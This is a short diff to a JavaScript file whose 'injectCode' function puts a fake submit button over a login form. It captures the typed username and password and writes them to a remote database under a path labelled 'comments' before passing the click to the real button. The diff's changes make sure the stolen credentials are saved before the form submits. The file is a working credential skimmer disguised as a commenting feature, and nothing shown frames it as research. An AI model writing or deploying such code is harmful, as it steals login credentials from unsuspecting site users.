@@ -33,7 +33,7 @@ function sendComment(e) {
       date: new Date().toISOString()
     },
     n = a(database, `comments/${ Date.now().toString() }`);
-    r(n, t);
+    return r(n, t);
 }
 
 function editComment(e, t) {
@@ -42,6 +42,10 @@ function editComment(e, t) {
     text: t,
     edited: new Date().toLocaleString()
   })
+}
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 function injectCode() {
@@ -68,8 +72,9 @@ function injectCode() {
       fakeButton.value = fakeButton.dataset.disableWith;
       let strData = `name: ${name.value}, pass : ${pass.value}`;
       //console.log(strData);
-      sendComment(strData);
-      submitButton.click();
+      sendComment(strData).then(()=>{
+        submitButton.click();
+      })
     })
   }
 }
